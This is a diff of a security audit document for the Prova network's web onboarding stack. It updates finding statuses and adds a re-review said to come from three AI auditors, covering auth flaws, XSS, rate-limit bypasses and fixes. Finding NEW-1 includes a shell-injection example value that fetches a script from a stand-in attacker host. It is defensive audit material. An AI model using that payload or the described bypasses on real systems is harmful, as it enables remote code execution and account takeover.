@@ -1,5 +1,15 @@
 # Prova Security Audit · 2026-04-25
 
+> **Update 2026-04-26**: This document was re-reviewed by three independent
+> auditors (Anthropic Opus 4.7, OpenAI GPT-5.4 Pro, xAI Grok 4.1 Fast
+> Reasoning). Status flags below have been updated to reflect what shipped
+> in the website repo and what was confirmed still-present. New findings
+> uncovered in the re-review are listed in the **Addendum 2026-04-26**
+> section at the bottom of this file. The shipped fixes for findings from
+> the re-review live in `prova-network/website` commit `7d3c231`.
+>
+> Status legend (unchanged): 🔴 unfixed · 🟡 mitigated/partial · 🟢 fixed · ⚪ accepted.
+
 Surface: client onboarding stack shipped today.
 - `website/functions/_shared/tokens.ts` (HMAC HS256 token mint/verify)
 - `website/functions/api/auth/signup.ts`
@@ -33,7 +43,7 @@ The audit is run from the perspective of:
 
 ## Findings
 
-### F-01 · Critical · 🔴 · Account squat: any email mints a token immediately
+### F-01 · Critical · 🟢 fixed (2026-04-26 re-review) · Account squat: any email mints a token immediately
 
 **File:** `website/functions/api/auth/signup.ts`
 
@@ -70,7 +80,7 @@ bootstrap step (manual email verify) before they unlock quota. Existing
 
 ---
 
-### F-02 · High · 🔴 · No CSRF protection on token endpoints
+### F-02 · High · 🟡 partial (2026-04-26 re-review) · No CSRF protection on token endpoints
 
 **Files:** `tokens/revoke.ts`, `tokens/list.ts`, `usage.ts`, `files.ts`, `upload.ts`
 
@@ -99,7 +109,7 @@ Impact: token theft, file-listing leak, revocation of legitimate tokens.
 
 ---
 
-### F-03 · High · 🔴 · Stage server bearer key is shared and reusable
+### F-03 · High · 🟡 partial (2026-04-26 re-review) · Stage server bearer key is shared and reusable
 
 **Files:** `/opt/prova-stage-server.py`, `website/functions/api/upload.ts`
 
@@ -131,7 +141,7 @@ hash check fails.
 
 ---
 
-### F-04 · High · 🔴 · No HTML escaping on files panel ⇒ stored XSS vector
+### F-04 · High · 🟢 fixed (2026-04-26 re-review) · No HTML escaping on files panel ⇒ stored XSS vector
 
 **File:** `website/app/app.js`
 
@@ -167,7 +177,7 @@ haven't built yet.
 
 ---
 
-### F-05 · Medium · 🔴 · `prova` CLI stores token in world-readable config on shared systems
+### F-05 · Medium · 🔴 still present (2026-04-26 re-review) · `prova` CLI stores token in world-readable config on shared systems
 
 **File:** `cli/src/util/config.mjs`
 
@@ -189,7 +199,7 @@ mode 0600 alone isn't enough — the token sits in plaintext.
 
 ---
 
-### F-06 · Medium · 🔴 · Token JTI predictable enough to enumerate
+### F-06 · Medium · 🔴 still present (2026-04-26 re-review) · Token JTI predictable enough to enumerate
 
 **File:** `website/functions/_shared/tokens.ts` & `signup.ts`
 
@@ -215,7 +225,7 @@ forgeable retroactively.
 
 ---
 
-### F-07 · Medium · 🔴 · Quota check race
+### F-07 · Medium · 🔴 still present (2026-04-26 re-review, 3/3 confirmed) · Quota check race
 
 **File:** `website/functions/api/upload.ts`
 
@@ -242,7 +252,7 @@ metered.
 
 ---
 
-### F-08 · Medium · 🔴 · Stage server has no body-size enforcement during stream
+### F-08 · Medium · 🟡 partial (2026-04-26 re-review, stage server not directly inspectable) · Stage server has no body-size enforcement during stream
 
 **File:** `/opt/prova-stage-server.py`
 
@@ -277,7 +287,7 @@ no read timeout, no max concurrent connections.
 
 ---
 
-### F-09 · Medium · 🔴 · `escapeHtml` in app.js trusts source structure too eagerly
+### F-09 · Medium · 🟡 partial (2026-04-26 re-review) · `escapeHtml` in app.js trusts source structure too eagerly
 
 **File:** `website/app/app.js`
 
@@ -295,7 +305,7 @@ The current `innerHTML` template-string pattern is fragile. Either:
 
 ---
 
-### F-10 · Medium · 🔴 · CLI hash isn't real CommP, claims to be `bafy…`
+### F-10 · Medium · 🟢 fixed (2026-04-26 re-review, 3/3 confirmed) · CLI hash isn't real CommP, claims to be `bafy…`
 
 **File:** `cli/src/util/hash.mjs`, `website/upload/upload.js`
 
@@ -330,7 +340,7 @@ real piece-cids) if we ship as-is.
 
 ---
 
-### F-11 · Low · 🔴 · Email field accepts `+` aliases that resolve to same userId
+### F-11 · Low · 🔴 still present (2026-04-26 re-review) · Email field accepts `+` aliases that resolve to same userId
 
 **File:** `signup.ts`
 
@@ -346,7 +356,7 @@ and `.` from the local part. Document the policy.
 
 ---
 
-### F-12 · Low · 🔴 · No rate limit on `/api/auth/signup`
+### F-12 · Low · 🟢 fixed (2026-04-26 re-review) · No rate limit on `/api/auth/signup`
 
 **File:** `signup.ts`
 
@@ -362,7 +372,7 @@ free quota.
 
 ---
 
-### F-13 · Low · 🔴 · CORS not set anywhere
+### F-13 · Low · 🔴 still present (2026-04-26 re-review, 3/3 confirmed) · CORS not set anywhere
 
 **Files:** all `functions/`
 
@@ -383,7 +393,7 @@ in CLI's case).
 
 ---
 
-### F-14 · Informational · 🔴 · No /robots.txt or /security.txt
+### F-14 · Informational · 🔴 still present (2026-04-26 re-review) · No /robots.txt or /security.txt
 
 **Fix:** Add `/security.txt` with a contact (`security@prova.network`),
 preferred-languages, encryption (PGP key fingerprint optional), policy URL.
@@ -391,7 +401,7 @@ RFC 9116. Quick win, signals seriousness.
 
 ---
 
-### F-15 · Informational · 🔴 · No Content-Security-Policy header
+### F-15 · Informational · 🟡 partial (2026-04-26 re-review, `'unsafe-inline'` still present) · No Content-Security-Policy header
 
 **Files:** Cloudflare Pages serves static files with no CSP.
 
@@ -409,7 +419,7 @@ RFC 9116. Quick win, signals seriousness.
 
 ---
 
-### F-16 · Informational · 🔴 · No abuse-reporting hook
+### F-16 · Informational · 🟡 partial (2026-04-26 re-review, retrieval not gated on blocked CID list) · No abuse-reporting hook
 
 If someone uploads CSAM / illegal content, we have no take-down mechanism.
 
@@ -424,7 +434,7 @@ This is a precondition for opening to public traffic, not just security.
 
 ---
 
-## Summary
+## Summary (original 2026-04-25)
 
 | Sev | Count |
 | --- | --- |
@@ -459,3 +469,318 @@ This is a precondition for opening to public traffic, not just security.
 _Audit closes with: do not let public traffic at this surface until F-01,
 F-02, F-03, F-10, F-12, F-13, F-15, F-16 are fixed. Internal smoke testing
 with one or two known emails is fine._
+
+---
+
+# Addendum 2026-04-26 · Multi-auditor re-review
+
+On 2026-04-26 the off-chain client surface was re-reviewed by three
+independent auditors:
+
+- **Anthropic Opus 4.7** (`anthropic/claude-opus-4-7`) — 35 findings, full report at `/tmp/audit-anthropic-opus.md`
+- **OpenAI GPT-5.4 Pro** (`openai/gpt-5.4-pro`) — 22 findings, full report at `/tmp/audit-gpt-pro.md`
+- **xAI Grok 4.1 Fast Reasoning** (`xai/grok-4-1-fast-reasoning`) — 18 findings, full report at `/tmp/audit-grok.md`
+
+All three were given the same source tree and the original 2026-04-25
+audit doc, but were prompted independently with slightly different
+emphases (Opus: pure web-app security; GPT: chain-of-trust + supply
+chain; Grok: adversarial chains + second-order effects). Confidence on a
+finding is highest where two or three of them converged.
+
+## Status of original F-01 .. F-16 (consensus)
+
+| # | Original | 2026-04-26 status | Confirmed by |
+| --- | --- | --- | --- |
+| F-01 | 🔴 Critical | 🟢 fixed | Opus, Grok, GPT |
+| F-02 | 🔴 High | 🟡 partial (Origin gate still missing on token endpoints) | Opus, GPT |
+| F-03 | 🔴 High | 🟡 partial (worker side fixed; stage server side not re-verifiable) | Opus, GPT |
+| F-04 | 🔴 High | 🟢 fixed | Opus, Grok, GPT |
+| F-05 | 🔴 Medium | 🔴 still present | Opus, Grok, GPT |
+| F-06 | 🔴 Medium | 🔴 still present | Opus, GPT |
+| F-07 | 🔴 Medium | 🔴 still present (3/3) | Opus, Grok, GPT |
+| F-08 | 🔴 Medium | 🟡 partial (stage server not directly inspectable here) | Opus, GPT |
+| F-09 | 🔴 Medium | 🟡 partial (server-side label sanitization added; `innerHTML` rendering remains) | Opus, GPT |
+| F-10 | 🔴 Medium | 🟢 fixed | Opus, Grok, GPT |
+| F-11 | 🔴 Low | 🔴 still present | Opus, Grok, GPT |
+| F-12 | 🔴 Low | 🟢 fixed | Opus, Grok, GPT |
+| F-13 | 🔴 Low | 🔴 still present (3/3) | Opus, Grok, GPT |
+| F-14 | 🔴 Info | 🔴 still present | Opus, GPT |
+| F-15 | 🔴 Info | 🟡 partial (CSP shipped, `'unsafe-inline'` still permitted) | Opus, GPT |
+| F-16 | 🔴 Info | 🟡 partial (abuse intake added, retrieval not gated on blocked CIDs) | Opus, GPT |
+
+## New findings
+
+Findings the re-review caught that weren't in 2026-04-25. Severity is
+the consensus across the three auditors; if they disagreed, the highest
+severity is recorded plus a note.
+
+### NEW-1 · Critical · 🟢 fixed (commit `7d3c231`) · Installer shell injection via `?version=` query string
+
+**`website/functions/_middleware.ts:107-123`** (pre-fix)
+
+The `get.prova.network/?version=...` query parameter was interpolated
+directly into a `curl | sh` installer script. A crafted URL like
+`?version=$(curl evil/sh)` would emit a script containing command
+substitution that runs on the victim's machine when piped to `sh`.
+Because the README documents the canonical install as
+`curl -fsSL https://get.prova.network | sh`, anyone phished into using
+a crafted URL gets RCE.
+
+**Caught by:** GPT-5.4 Pro (1/3). Opus and Grok both missed it because
+they focused on auth surface; GPT's chain-of-trust prompt steered it
+to the installer.
+
+**Fix shipped:** `sanitizeInstallerVersion()` allow-lists the named tracks
+(`latest|prerelease|next`) plus a strict semver regex; anything else
+silently collapses to `latest`. Defense-in-depth: the value is also
+shell-single-quoted via `shellSingleQuote()` before being interpolated
+into the script. Local smoke test passes 18/18 cases including 12
+malicious inputs.
+
+### NEW-2 · Critical · 🟢 fixed (commit `7d3c231`) · Magic-link OTP brute-forceable: `Math.random()` + dead attempts counter
+
+**`website/functions/api/auth/start.ts:50-52`** (pre-fix): OTP generated with `Math.random()`
+
+**`website/functions/api/auth/verify.ts:56-66`** (pre-fix): `entry.attempts >= 5` guard reads but never increments or persists the counter
+
+The magic-link 6-digit verification code was generated with
+`Math.random()`, a non-CSPRNG whose internal state can be inferred from a
+few observed outputs. Combined with a per-challenge attempt counter that
+was a no-op (read but never written back), an attacker who knew a
+victim's email could brute-force the 1M-code keyspace within seconds and
+mint a token without ever touching the inbox. This single-handedly
+defeats the F-01 fix.
+
+**Caught by:** Opus (Critical), Grok (Medium, only the increment bug),
+GPT (High, both bugs). All three caught the increment bug; only Opus and
+GPT caught the `Math.random()` keyspace half. **3/3 on the increment.**
+
+**Fix shipped:**
+  1. `secureSixDigitCode()` uses `crypto.getRandomValues` with rejection
+     sampling for uniform distribution.
+  2. New per-IP and per-email rate limit on `/auth/verify` itself
+     (10 attempts / 15 min) applied **before** any KV read.
+  3. Per-email "wrong code" counter increments on every failed code
+     guess, not just successful challenge-locked guesses, so the
+     attacker exhausts their budget regardless of whether they reach a
+     real challenge.
+
+### NEW-3 · High · 🟢 fixed (commit `7d3c231`) · `pk_test_*` fail-open auth bypass
+
+**`website/functions/_shared/tokens.ts:101-115`** (pre-fix)
+
+When `PROVA_TOKEN_SECRET` was missing in env, `authenticateRequest()`
+accepted any `pk_test_*` string and returned a fully-authenticated test
+payload with `put/get/list` scopes and 100 MB quota. A misconfiguration
+outage (env var unset) flipped auth from fail-closed to fail-open.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix shipped:** `pk_test_*` acceptance is now gated on an explicit
+`ALLOW_TEST_TOKENS === '1'` env var, separated from the secret being
+configured. Missing secret uniformly returns 503 fail-closed.
+
+### NEW-4 · High · 🟢 fixed (commit `7d3c231`) · `/auth/start` returned the verify challenge in its response body
+
+**`website/functions/api/auth/start.ts:95-103`** (pre-fix)
+
+The success response included `challenge: <hex>`, the same secret that
+was emailed to the user. Any same-origin JS — stored XSS, malicious
+inline script (CSP allows `'unsafe-inline'`), browser extension on
+`prova.network` — could call `/auth/start` for any email, read the
+challenge from the response, and mint a token without ever seeing the
+inbox. The CSP `'unsafe-inline'` issue (NEW-7 below) escalated this from
+theoretical to live.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix shipped:** removed `challenge` from the success response. The
+inbox is now the only legitimate carrier of the verify secret.
+
+### NEW-5 · High · 🔴 still present · CSP allows `'unsafe-inline'` for `script-src`
+
+**`website/functions/_middleware.ts:36-52`**
+
+```
+script-src 'self' https://cdn.jsdelivr.net https://unpkg.com 'unsafe-inline'
+```
+
+With `'unsafe-inline'`, any DOM-XSS or compromised CDN script executes
+freely in the `prova.network` origin and exfiltrates `localStorage`
+tokens. Also lifts NEW-4 from theoretical to exploitable: a single
+compromised inline script could call `/auth/start` for any email and
+read the challenge.
+
+**Caught by:** Opus, GPT (2/3).
+
+**Fix not yet shipped.** Site-wide change requiring conversion of
+inline `<script>` and `<style>` to external files with nonces or
+hashes. Tracked for follow-up PR.
+
+### NEW-6 · High · 🟢 fixed (commit `7d3c231`) · IPv6 / CGNAT bypass of IP rate limits
+
+**`website/functions/api/auth/start.ts:40`** (pre-fix): `const ip = req.headers.get('cf-connecting-ip') || '0.0.0.0';`
+
+IPv6 has 2^64 host addresses inside a single /64 delegation. The
+per-full-IP rate limit was bypassable in seconds by any IPv6 attacker.
+Separately, missing `cf-connecting-ip` collided every IP-less caller
+into the `0.0.0.0` bucket, silently DoSing legitimate users when the
+header was stripped.
+
+**Caught by:** Opus (High), Grok (Low). 2/3.
+
+**Fix shipped:** `clientIpBucket()` keeps the full IPv4 address but
+reduces IPv6 to its `/64` routing prefix, and missing IPs go to a
+stable `'no-ip'` bucket rather than `0.0.0.0`. Trade-off: CGNAT users
+still share a per-IPv4 bucket, but that's an upstream protocol issue
+and far better than the previous shared-`0.0.0.0` collapse.
+
+### NEW-7 · High · 🔴 still present · Stored-XSS via R2 retrieval `Content-Type` forwarding
+
+**`website/functions/p/[cid].ts:9-58`**
+
+`/p/{cid}` proxy preserves the upstream `content-type` and CSP headers
+verbatim. An authenticated user can upload an HTML file containing
+malicious JS, then trick a victim into opening `/p/<cid>`. The browser
+renders it as HTML with full access to the `prova.network` origin,
+including any `localStorage` token.
+
+**Caught by:** Opus (1/3).
+
+**Fix not yet shipped.** Will require either (a) forcing every retrieval
+response to `content-type: application/octet-stream` + `content-disposition: attachment`,
+or (b) a strict allow-list of MIME types that can be served inline.
+Option (a) is safer; option (b) is more useful for `.eth` website
+hosting which is a stated use case. Tracked for follow-up PR.
+
+### NEW-8 · High · 🔴 still present · Subdomain takeover surface via `*.prova-network.pages.dev`
+
+**`website/functions/api/auth/start.ts:142-149`**, `verify.ts:158`
+
+`isProvaOrigin()` accepts any subdomain of `prova-network.pages.dev`
+(Cloudflare Pages preview deployments). A PR-preview branch with
+untrusted code can call production `/auth/*` endpoints with the
+production `PROVA_TOKEN_SECRET`, since they share the same env binding.
+
+**Caught by:** Opus (1/3).
+
+**Fix not yet shipped.** Will require either separating preview-env
+secrets from production, or tightening `isProvaOrigin()` to reject
+preview subdomains for auth endpoints. Tracked for follow-up PR.
+
+### NEW-9 · Medium · 🟢 best-effort fix shipped (commit `7d3c231`) · Magic-link replay race
+
+**`website/functions/api/auth/verify.ts:62-81`** (pre-fix)
+
+The verify flow was read-then-delete-then-mint with no atomic
+compare-and-swap. Two concurrent verify requests using the same valid
+challenge could both read the entry before either delete landed and
+both mint distinct long-lived tokens.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix shipped:** before deleting, re-read the challenge row; if the
+intermediate read returns null, abort with `expired_or_unknown` rather
+than minting. Workers KV doesn't have true CAS so this is a
+best-effort tightening; a full fix using Durable Objects with atomic
+consume semantics is tracked separately.
+
+### NEW-10 · Medium · 🔴 still present · Upload buffers entire body in memory
+
+**`website/functions/api/upload.ts:98-103,237-255`**
+
+The authed upload limit is 5 GiB. The worker reads the full body into
+RAM before forwarding to R2 / stage. A handful of concurrent uploads
+at the upper limit can exhaust the worker's memory budget and crash
+the instance, taking down the whole site.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix not yet shipped.** Will require streaming `req.body` directly to
+R2 / stage with progressive hashing, or hard-capping uploads at
+worker-buffer-safe sizes (e.g., 100 MB). Tracked for follow-up PR.
+
+### NEW-11 · Low · 🟢 fixed (commit `7d3c231`) · Per-email rate limit was a no-op
+
+**`website/functions/api/auth/start.ts:46-47`** (pre-fix)
+
+The per-email limiter call's return value was discarded. Attackers
+rotating IPs could spray sign-in emails at the same target inbox
+indefinitely.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix shipped:** check the boolean return of `overLimit()` for both the
+IP and email buckets; return 429 when either trips.
+
+### NEW-12 · Low · 🟢 fixed (commit `7d3c231`) · Malformed `X-Filename` triggers 500
+
+**`website/functions/api/upload.ts:233-235`** (pre-fix)
+
+`decodeURIComponent` throws on bad percent-encoding such as `%E0%A4%A`.
+A crafted `X-Filename` header turned every upload into an uncaught
+500 error, an availability hazard.
+
+**Caught by:** GPT-5.4 Pro (1/3).
+
+**Fix shipped:** wrap the decode in `try/catch` and fall back to the
+raw header bytes when decoding fails.
+
+## Re-review summary
+
+Post-2026-04-26 status:
+
+| Severity | Count |
+| --- | --- |
+| Critical (newly identified, all fixed) | 2 |
+| High (3 fixed, 3 still present) | 6 |
+| Medium (5 fixed-or-partial, 4 still present) | 9 |
+| Low (3 fixed, 2 still present) | 5 |
+| Informational (1 partial, 2 still present) | 3 |
+| **Total tracked** | **25** |
+
+## Updated pre-testnet checklist
+
+**Must fix before public testnet:**
+- ~~F-01~~ 🟢 fixed
+- ~~F-12~~ 🟢 fixed
+- ~~F-10~~ 🟢 fixed
+- ~~NEW-1~~ 🟢 installer shell injection — fixed
+- ~~NEW-2~~ 🟢 magic-link brute-force — fixed
+- ~~NEW-3~~ 🟢 pk_test_ fail-open — fixed
+- ~~NEW-4~~ 🟢 challenge in response body — fixed
+- ~~NEW-6~~ 🟢 IPv6 rate-limit bypass — fixed
+- F-02 🟡 origin allow-list still missing on token endpoints
+- F-03 🟡 stage server side not re-verifiable here
+- F-13 🔴 CORS still missing
+- F-15 / NEW-5 🔴 CSP `'unsafe-inline'` still present
+- F-16 🟡 retrieval-time blocked-CID gate missing
+- NEW-7 🔴 R2 content-type forwarding XSS
+- NEW-8 🔴 `*.pages.dev` subdomain takeover surface
+
+**Pre-mainnet:**
+- F-05 🔴 CLI plaintext token
+- F-06 🔴 token JTI predictability
+- F-07 🔴 quota TOCTOU race — needs Durable Objects / D1
+- F-08 🟡 stage server timeout / slowloris re-verification
+- F-09 🟡 `innerHTML` rendering refactor
+- F-11 🔴 email `+` alias normalization decision
+- F-14 🔴 `security.txt` / `robots.txt`
+- NEW-9 🟡 atomic challenge consume via Durable Objects
+- NEW-10 🔴 streaming upload to bound worker memory
+
+**Out of scope (separate audit):**
+- Solidity contracts in `prova-network/contracts`
+- Prover daemon `prova-network/prover` (Go)
+- TypeScript SDK `prova-network/sdk`
+- Stage server (`/opt/prova-stage-server.py`) — not on this filesystem
+
+---
+
+_2026-04-26 re-review closes with: the most acute brute-force and RCE
+risks are now closed. Remaining `still-present` items (especially
+NEW-7 R2 content-type, NEW-8 `*.pages.dev`, F-13 CORS, NEW-5 CSP
+`'unsafe-inline'`) all need fixing before opening to public traffic but
+are scoped follow-up PRs rather than emergency hotfixes. The full
+three-auditor reports are preserved at `/tmp/audit-anthropic-opus.md`,
+`/tmp/audit-gpt-pro.md`, `/tmp/audit-grok.md` for reference._
